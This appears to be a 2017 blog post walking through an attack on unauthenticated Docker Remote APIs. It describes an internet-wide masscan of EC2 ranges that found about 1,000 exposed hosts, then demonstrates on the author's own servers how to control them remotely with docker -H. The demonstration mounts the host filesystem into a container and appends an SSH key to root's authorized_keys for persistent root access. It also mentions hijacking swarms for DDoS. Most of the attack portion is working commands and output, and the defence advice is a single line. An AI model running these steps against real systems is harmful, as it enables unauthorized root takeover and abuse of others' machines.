+++
title = "Free compute with unsecured Docker APIs."
date = 2017-10-31
+++

The other day I was casually browsing the internet and was reading about how thousands of MongoDB databases were exposed
to the internet. Unauthenticated for the world to use. Bandits encrypted databases and held them for randsom. A randsom
payable in your favorite crypto currency. This all happened a few months ago, and surely we've all learnt not to expose
our services for the entire world to use? Right? ... right?

Well, if you'd assume that people never learn you're right on the money, my friend. So in todays episode of "Wow I can't
believe people are still doing that" I present to you: "Exploiting the Docker Remote API, or how to root thousands of
machines"

Because scanning the entire internet for open ports is bad, I decided to be curtious and port scan only the IP blocks
that Amazon exposes for their EC2 instances. Mind you, this is still over 27 million IP addresses but it would be a good
enough sample size for me.

Using masscan, and a low `--rate`, I scanned all 27 million IP addresses for the Docker remote API ports and found 3,000
servers that were actively listening on this port. A little filtering and probing later and I found a little over a 1000
servers that have have an unsecured Docker API.

Because I'm a strong believer in ethics (oh?), I decided not to probe any deeper but instead demonstrate what a
potential attack could look like, and how I could've rooted a thousand servers with ease to launch a _sick_ denial of
service attack.

## Step 1. Finding a vulnerable machine

For demonstration purposes, I've spun up 3 small instances on Digital Ocean running a Docker Swarm.

```
root@swarm-1:~# docker node ls                                      
ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS             
ni2087pprn601724too0ys0b3 *   swarm-1             Ready               Active              Leader                     
0qqozi3jv21w9nr2oax97opvi     swarm-2             Ready               Active                                        
umxd955a9cqxeag3v1howj287     swarm-3             Ready               Active
```

Some quick Googling on how to enable the Docker remote API, will send
you [here](https://www.ivankrizsan.se/2016/05/18/enabling-docker-remote-api-on-ubuntu-16-04/), and will conveniently
show you how to make the remote API listen on all your network addresses. The post was shy of asking users to add a rule
to their iptables, but because Digital Ocean is a sweetheart and doesn't provide a running firewall by default, and
because their default ubuntu image comes with the firewall disabled out of the box there is nothing to worry about.

A quick restart of my Docker daemon and:

```
GET http://128.199.130.138:4243/
{
"message": "page not found"
}
```

Will show that we're in!

```
GET http://128.199.130.138:4243/nodes
[
{
    "ID": "0qqozi3jv21w9nr2oax97opvi",
},
{
    "ID": "ni2087pprn601724too0ys0b3",
},
{
    "ID": "umxd955a9cqxeag3v1howj287"
}
]
```

Sweet, we have access.

## Step 2. Connecting to the CLI

When you look through the [Engine API](https://docs.docker.com/engine/api/v1.24/) you'll see that you can wreack enough
havoc, but for fun let's use the docker CLI!

```
[brian@localhost ~]$ docker -H 128.199.130.138:4243 node ls
ID                           HOSTNAME  STATUS  AVAILABILITY  MANAGER STATUS
0qqozi3jv21w9nr2oax97opvi    swarm-2   Ready   Active        
ni2087pprn601724too0ys0b3 *  swarm-1   Ready   Active        Leader
umxd955a9cqxeag3v1howj287    swarm-3   Ready   Active       
```

Now we're getting somewhere. Full access ahoy.

If you have a little bit of imagination you can realise that we can easily launch a bunch of containers to perform a
distributed denial of service attack. We could easily find all docker machines, make them leave their swarm, then make
them join our malicious swarm to really ramp things up.

However for this excercise, let's not

## Step 3. Rooting the host

With Docker you can run images in interactive terminal mode, and mount the hosts volume to the container. So why not
mount the root volume:

```
[brian@localhost ~]$ docker -H 128.199.130.138:4243 run -v /:/host -it ubuntu
Unable to find image 'ubuntu:latest' locally
latest: Pulling from library/ubuntu
...
Status: Downloaded newer image for ubuntu:latest
root@4d2d6002beff:/# 
```

To confirm we've mounted the hosts root, and not our local drive:

```
root@58e0c2532e1e:/host# cat /host/etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
```

Making our way to the `~/.ssh` folder to add our own public key:

```
root@58e0c2532e1e:/host/root/.ssh# echo "ssh-rsa publickey" >> authorized_keys
```

Now from our local machine:

```
[brian@localhost ~]$ ssh -i ~/.ssh/docker-funtime root@128.199.130.138
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-93-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  Get cloud support with Ubuntu Advantage Cloud Guest:
    http://www.ubuntu.com/business/services/cloud

47 packages can be updated.
24 updates are security updates.


Last login: Tue Oct 10 09:47:55 2017 from 118.238.203.186
root@swarm-1:~# docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
58e0c2532e1e        ubuntu              "/bin/bash"         8 minutes ago       Up 8 minutes                            naughty_jennings
```

Taadaa -- you have succesfully rooted an unprotoced docker swarm host.

# How to prevent this?

Simple: do not, under any circumstance, expose your docker APIs to the internet.